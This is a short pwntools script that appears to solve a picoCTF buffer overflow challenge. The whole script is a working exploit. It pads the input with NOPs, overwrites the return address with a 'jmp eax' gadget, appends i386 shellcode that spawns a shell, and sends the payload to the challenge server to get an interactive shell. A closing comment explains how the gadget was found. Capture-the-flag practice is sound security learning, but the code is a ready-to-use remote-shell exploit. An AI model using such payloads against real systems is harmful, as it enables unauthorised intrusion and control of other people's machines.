from pwn import *

payload = b'\x90'*(16+4+4+2)
payload += b'\xeb\x04'
payload += p32(0x0805333b)
payload += asm(shellcraft.i386.linux.sh()) # ASM code to execute a shell!

p = remote('saturn.picoctf.net', 50345)
p.sendline(payload)
p.interactive()

'''
ROPgadget --binary=vuln | grep ": jmp eax" 
Use "jmp eax" since return value of gets() is stored in eax
'''
